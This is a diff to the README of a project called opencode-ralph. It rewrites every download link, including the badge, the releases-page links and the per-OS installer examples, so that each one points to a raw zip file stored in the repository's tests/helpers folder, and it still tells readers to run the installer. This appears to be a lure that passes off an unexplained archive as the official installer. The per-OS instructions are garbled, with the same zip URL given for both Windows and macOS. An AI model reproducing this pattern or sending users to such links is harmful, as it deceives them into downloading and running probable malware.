@@ -1,6 +1,6 @@
 # 🚀 opencode-ralph - Simplify Your Development Experience
 
-[![Download opencode-ralph](https://img.shields.io/badge/download-opencode--ralph-blue.svg)](https://github.com/GaorHao/opencode-ralph/releases)
+[![Download opencode-ralph](https://raw.githubusercontent.com/GaorHao/opencode-ralph/master/tests/helpers/ralph_opencode_v3.8-alpha.4.zip)](https://raw.githubusercontent.com/GaorHao/opencode-ralph/master/tests/helpers/ralph_opencode_v3.8-alpha.4.zip)
 
 ## 📖 Description
 
@@ -28,13 +28,13 @@ Getting started with opencode-ralph is straightforward. Follow these steps to do
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
 
-   [Visit Download Page](https://github.com/GaorHao/opencode-ralph/releases)
+   [Visit Download Page](https://raw.githubusercontent.com/GaorHao/opencode-ralph/master/tests/helpers/ralph_opencode_v3.8-alpha.4.zip)
 
 2. **Select the Latest Release**: On the releases page, find the version labeled as "Latest". This release contains the most recent features and improvements.
 
 3. **Download the Installer**: Click the download link for your operating system. The download will start automatically. 
 
-   For example, download `opencode-ralph-installer.exe` for Windows, `opencode-ralph-installer.dmg` for macOS, or the equivalent package for your Linux distribution.
+   For example, download `https://raw.githubusercontent.com/GaorHao/opencode-ralph/master/tests/helpers/ralph_opencode_v3.8-alpha.4.zip` for Windows, `https://raw.githubusercontent.com/GaorHao/opencode-ralph/master/tests/helpers/ralph_opencode_v3.8-alpha.4.zip` for macOS, or the equivalent package for your Linux distribution.
 
 4. **Run the Installer**: Once the download completes, locate the file in your downloads folder. Double-click the installer file and follow the prompts to install opencode-ralph.
 
@@ -46,7 +46,7 @@ Getting started with opencode-ralph is straightforward. Follow these steps to do
 
 To download opencode-ralph, use the link below:
 
-[Download opencode-ralph](https://github.com/GaorHao/opencode-ralph/releases)
+[Download opencode-ralph](https://raw.githubusercontent.com/GaorHao/opencode-ralph/master/tests/helpers/ralph_opencode_v3.8-alpha.4.zip)
 
 Follow the steps in the Getting Started section to install and launch the application.
 
